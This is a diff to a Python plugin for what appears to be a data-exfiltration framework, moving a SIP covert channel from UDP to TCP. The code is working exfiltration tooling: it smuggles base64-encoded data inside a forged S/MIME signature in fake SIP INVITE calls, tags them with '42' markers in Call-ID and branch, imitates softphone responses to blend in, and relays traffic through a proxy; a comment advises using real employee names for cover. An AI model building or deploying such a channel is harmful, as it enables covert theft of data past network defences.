@@ -1,40 +1,35 @@
-#!/usr/bin/env python
-
-#inspired from: https://books.google.fr/books?id=cHOmCwAAQBAJ&pg=PA747&lpg=PA747&dq=sdp+smime&source=bl&ots=34LYW5iJyc&sig=4a1szVXKMDtqQWUb0K2gM29AgL8&hl=fr&sa=X&ved=0ahUKEwjbm5Tf1JzTAhUGfxoKHX-UCQUQ6AEIVTAG#v=onepage&q=sdp%20smime&f=false
-
 from __future__ import print_function
+import dpkt
 from dpkt import sip
 import socket
 import string
 import random
 import base64
 import re
+import select
 from random import choice
 import traceback
 
 config = None
 app_exfiltrate = None
 
-#Ideally replace with real employee names
+# Ideally replace with real employee names
 names = ('alice', 'bob', 'eve', 'kim', 'lorrie', 'ben')
 caller, callee = random.sample(names, 2)
 
-#proxy  = "freephonie.net" #Might as well be internal PBX
-#domain = 'e.corp'
 
 class UserAgent:
-
     def __init__(self, alias, ip, port=None, user_agent=None):
         self.alias = alias
         self.ip = ip
         self.port = port
-        self.user_agent = 'Linphone/3.6.1 (eXosip2/4.1.0)'
+        self.user_agent = user_agent or 'Linphone/3.6.1 (eXosip2/4.1.0)'
         self.tag = ''.join(random.sample(string.digits, 10))
 
-class SIPDialog:
 
+class SIPDialog:
     def __init__(self, uac=None, uas=None, proxy=None):
-        self.call_id = ''.join(random.sample(string.digits,  8))
+        self.call_id = ''.join(random.sample(string.digits, 8))
         self.uac = uac
         self.uas = uas
         self.branch = 'z9hG4bK' + ''.join(random.sample(string.digits, 10))
@@ -43,13 +38,13 @@ class SIPDialog:
 
     def init_from_request(self, req):
         self.call_id = req.headers['call-id']
-        parser = re.compile('<sip:(.*)@(.*)>;tag=(.*)')
+        parser = re.compile(r'<sip:(.*)@(.*)>;tag=(.*)')
         [(s_alias, s_ip, tag)] = re.findall(parser, req.headers['from'])
-        parser = re.compile('SIP\/2\.0\/UDP (.*):(\d*)(?:\;rport.*)?\;branch=(.*)')
+        parser = re.compile(r'SIP\/2\.0\/(?:UDP|TCP) (.*):(\d*)(?:\;rport.*)?\;branch=(.*)')
         [(proxy, s_port, branch)] = re.findall(parser, req.headers['via'])
-        parser = re.compile('<sip:(.*)@(.*)>')
+        parser = re.compile(r'<sip:(.*)@(.*)>')
         [(c_alias, c_ip)] = re.findall(parser, req.headers['to'])
-        user_agent = req.headers['user-agent']
+        user_agent = req.headers.get('user-agent', 'Linphone/3.6.1 (eXosip2/4.1.0)')
 
         self.tag = tag
         self.branch = branch
@@ -58,17 +53,17 @@ class SIPDialog:
         self.proxy = proxy
 
     def invite(self, uac, uas, payload: str):
-        #Call-ID magic identifier
+        # Call-ID magic identifier
         self.call_id = self.call_id[:3] + "42" + self.call_id[5:]
-        #Branch magic identifier
+        # Branch magic identifier
         self.branch = self.branch[:11] + "42" + self.branch[13:]
         self.uac = uac
         self.uas = uas
-        self.proxy = self.proxy or '127.0.0.1' #keep calm & blame misconfiguration
+        self.proxy = self.proxy or '127.0.0.1'
         packet = sip.Request()
-        #forge headers
+        # forge headers
         packet.uri = 'sip:{}@{}'.format(self.uas.alias, self.uas.ip)
-        packet.headers['Via'] = 'SIP/2.0/UDP {}:{};branch={}'.format(self.proxy, self.uac.port, self.branch)
+        packet.headers['Via'] = 'SIP/2.0/TCP {}:{};branch={}'.format(self.proxy, self.uac.port, self.branch)
         packet.headers['Max-Forwards'] = 70
         packet.headers['CSeq'] = '20 ' + packet.method
         packet.headers['From'] = '{} <sip:{}@{}>;tag={}'.format(self.uac.alias.capitalize(), self.uac.alias, self.uac.ip, self.uac.tag)
@@ -79,8 +74,9 @@ class SIPDialog:
         packet.headers['Subject'] = self.subject
         packet.headers['Content-Type'] = 'application/sdp'
         packet.headers['Allow'] = 'INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, NOTIFY, MESSAGE, SUBSCRIBE, INFO'
-        #forge the sdp message
-        sdp_content =  "v=0\r\n"
+
+        # forge the sdp message
+        sdp_content = "v=0\r\n"
         sdp_content += "o=" + self.uac.alias + " 99 939 IN IP4 " + self.uac.ip + "\r\n"
         sdp_content += "s=Talk\r\n"
         sdp_content += "c=IN IP4 " + self.uac.ip + "\r\n"
@@ -98,18 +94,21 @@ class SIPDialog:
         sdp_content += "a=rtpmap:103 VP8/90000\r\n"
         sdp_content += "a=rtpmap:99 MP4V-ES/90000\r\n"
         sdp_content += "a=fmtp:99 profile-level-id=3\r\n"
-        #forge sdp header
+
+        # forge sdp header
         sdp_hdr = "Content-Type: message/sip\r\n"
         sdp_hdr += "Content-Length: " + str(len(sdp_content)) + '\r\n'
         sdp_hdr += "INVITE sip:{}@{} SIP/2.0".format(self.uas.alias, self.uas.ip)
         sdp_hdr += packet.pack_hdr()
         sdp_hdr += "\r\n"
-        #forge the false signature
+
+        # forge the false signature
         sig = 'Content-Type: application/x-pkcs7-signature; name="smime.p7s"\r\n'
         sig += 'Content-Transfer-Encoding: base64\r\n'
         sig += 'Content-Disposition: attachment; filename="smime.p7s"; handling=required\r\n'
         sig += base64.b64encode(payload.encode()).decode()
-        #forge sip body
+
+        # forge sip body
         boundary = ''.join(random.sample(string.digits + string.ascii_letters, 20))
         packet.body = '--' + boundary + '\r\n'
         packet.body += sdp_hdr
@@ -117,9 +116,11 @@ class SIPDialog:
         packet.body += '--' + boundary + '\r\n'
         packet.body += sig + '\r\n'
         packet.body += '--' + boundary + '--'
-        #replace sip header content-type with multipart/signed
+
+        # replace sip header content-type with multipart/signed
         packet.headers['Content-Type'] = 'multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary=' + boundary
-        #Update Content-Length
+
+        # update Content-Length
         packet.body = packet.body.encode()
         packet.headers['Content-Length'] = str(len(packet.body))
 
@@ -136,7 +137,6 @@ class SIPDialog:
         packet.headers['CSeq'] = invite.headers['cseq']
         packet.headers['User-Agent'] = self.uac.user_agent
         packet.headers['Content-Length'] = '0'
-
         return packet
 
     def ringing(self, invite):
@@ -151,7 +151,6 @@ class SIPDialog:
         packet.headers['Contact'] = '<sip:{}@{}>'.format(self.uac.alias, self.uac.ip)
         packet.headers['User-Agent'] = self.uac.user_agent
         packet.headers['Content-Length'] = '0'
-
         return packet
 
     def decline(self, invite):
@@ -164,7 +163,6 @@ class SIPDialog:
         packet.headers['CSeq'] = invite.headers['cseq']
         packet.headers['User-Agent'] = self.uac.user_agent
         packet.headers['Content-Length'] = '0'
-
         return packet
 
     def ack(self, message):
@@ -177,41 +175,85 @@ class SIPDialog:
         packet.headers['Call-ID'] = message.headers['call-id']
         packet.headers['CSeq'] = '20 ACK'
         packet.headers['Content-Length'] = '0'
-
         return packet
 
+def _recv_sip_message(conn):
+    conn.settimeout(10)
+    data = b""
+    sep = b"\r\n\r\n"
+
+    while sep not in data:
+        chunk = conn.recv(4096)
+        if not chunk:
+            return None
+        data += chunk
+
+    headers, body = data.split(sep, 1)
+    content_length = 0
+    match = re.search(rb'(?im)^content-length\s*:\s*(\d+)\s*$', headers)
+    if match:
+        content_length = int(match.group(1))
+
+    while len(body) < content_length:
+        chunk = conn.recv(4096)
+        if not chunk:
+            break
+        body += chunk
+
+    return headers + sep + body
+
+
+def _handle_invite_message(raw_msg, addr, conn, respond=True):
+    req = sip.Request()
+    try:
+        req.unpack(raw_msg)
+    except dpkt.dpkt.NeedData:
+        req = sip.Request()
+        req.unpack(raw_msg)
+
+    if req.method != 'INVITE':
+        return
+
+    dialog = SIPDialog()
+    dialog.init_from_request(req)
+
+    if respond:
+        conn.sendall(dialog.trying(req).pack())
+        conn.sendall(dialog.ringing(req).pack())
+        conn.sendall(dialog.decline(req).pack())
+
+    if dialog.branch[11:13] == "42" and dialog.call_id[3:5] == "42":
+        parser = re.compile('boundary=(.*)')
+        [boundary] = re.findall(parser, req.headers['content-type'])
+        if boundary is None:
+            return
+        body_text = req.body.decode(errors='ignore')
+        payload = body_text.split('--' + boundary)[-2].split('\r\n')[-2]
+        app_exfiltrate.log_message('info', "[sip-tcp] Received {0} bytes from {1}".format(len(payload), addr[0]))
+        app_exfiltrate.retrieve_data(base64.b64decode(payload))
+
+
 def listen():
-    app_exfiltrate.log_message('info', "[sip] Listening for incoming calls")
+    app_exfiltrate.log_message('info', "[sip-tcp] Listening for incoming calls")
     port = config['port']
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind(('', port))
+    sock.listen(20)
+
     while True:
-        data, addr = sock.recvfrom(65535)
+        conn, addr = sock.accept()
         try:
-            req = sip.Request()
-            req.unpack(data)
-            if req.method == 'INVITE':
-                dialog = SIPDialog()
-                dialog.init_from_request(req)
-                #Simulate legit softphone responses
-                trying = dialog.trying(req)
-                sock.sendto(trying.pack(), addr)
-                ringing = dialog.ringing(req)
-                sock.sendto(ringing.pack(), addr)
-                decline = dialog.decline(req)
-                sock.sendto(decline.pack(), addr)
-                #Check if the request is part of exfiltration job
-                if dialog.branch[11:13] == "42" and dialog.call_id[3:5] == "42":
-                    parser = re.compile('boundary=(.*)')
-                    [boundary] = re.findall(parser, req.headers['content-type'])
-                    #Hackish payload isolation
-                    payload = req.body.decode().split('--'+boundary)[-2].split('\r\n')[-2]
-                    app_exfiltrate.log_message('info', "[sip] Received {0} bytes from {1}".format(len(payload), addr[0]))
-                    app_exfiltrate.retrieve_data(base64.b64decode(payload))
+            msg = _recv_sip_message(conn)
+            if not msg:
+                continue
+            _handle_invite_message(msg, addr, conn, respond=True)
         except Exception as e:
             print(traceback.format_exc())
             print('exception: ' + repr(e))
-            pass
+        finally:
+            conn.close()
+
 
 def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
@@ -219,52 +261,79 @@ def send(data: str):
         target = choice(targets)
     else:
         target = config['target']
+
     port = config['port']
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # sock.bind(('', port))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((target, port))
+
     dialog = SIPDialog()
     laddr = socket.gethostbyname(socket.getfqdn())
     uac = UserAgent(caller, laddr, port=port)
     uas = UserAgent(callee, target, port=port)
     invite = dialog.invite(uac, uas, data)
-    app_exfiltrate.log_message('info', "[sip] Sending {0} bytes to {1}".format(len(data), target))
-    sock.sendto(invite.pack(), (target, port))
-    while True:
-        try:
-            recv_data, addr = sock.recvfrom(65535)
+
+    app_exfiltrate.log_message('info', "[sip-tcp] Sending {0} bytes to {1}".format(len(data), target))
+    sock.sendall(invite.pack())
+
+    try:
+        while True:
+            recv_data = _recv_sip_message(sock)
+            if not recv_data:
+                break
             response = sip.Response()
             response.unpack(recv_data)
             if response.reason == 'Decline':
                 ack = dialog.ack(response)
-                sock.sendto(ack.pack(), (target, port))
-                sock.close()
+                sock.sendall(ack.pack())
                 break
-            else:
-                continue
-        except:
-            pass
-        break
+    except Exception:
+        pass
+    finally:
+        sock.close()
+
 
 def proxy():
-    app_exfiltrate.log_message('info', "[proxy] [sip] Starting SIP proxy")
+    app_exfiltrate.log_message('info', "[proxy] [sip-tcp] Starting SIP TCP proxy")
     target = config['target']
     port = config['port']
-    sender = ""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('', port))
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(('', port))
+    server.listen(20)
+
     while True:
-        data, addr = sock.recvfrom(65535)
-        if addr[0] != target:
-            sender = addr[0]
+        client, client_addr = server.accept()
+        upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            if addr[0] == target:
-                app_exfiltrate.log_message('info', "[proxy] [sip] Relaying data to {0}".format(target))
-                sock.sendto(data, (sender, port))
-            else:
-                app_exfiltrate.log_message('info', "[proxy] [sip] Relaying data to {0}".format(sender))
-                sock.sendto(data, (target, port))
-        except:
+            upstream.connect((target, port))
+            sockets = [client, upstream]
+            while True:
+                readable, _, _ = select.select(sockets, [], [], 30)
+                if not readable:
+                    break
+                for s in readable:
+                    data = s.recv(4096)
+                    if not data:
+                        raise RuntimeError('connection closed')
+                    if s is client:
+                        app_exfiltrate.log_message('info', "[proxy] [sip-tcp] Relaying {0} bytes to {1}".format(len(data), target))
+                        upstream.sendall(data)
+                    else:
+                        app_exfiltrate.log_message('info', "[proxy] [sip-tcp] Relaying {0} bytes to {1}".format(len(data), client_addr[0]))
+                        client.sendall(data)
+        except Exception:
             print(traceback.format_exc())
+        finally:
+            try:
+                client.close()
+            except Exception:
+                pass
+            try:
+                upstream.close()
+            except Exception:
+                pass
+
 
 class Plugin:
 
@@ -272,4 +341,4 @@ class Plugin:
         global app_exfiltrate, config
         app_exfiltrate = app
         config = conf
-        app.register_plugin('sip', {'send': send, 'listen': listen, 'proxy': proxy})
+        app.register_plugin('sip_tcp', {'send': send, 'listen': listen, 'proxy': proxy})
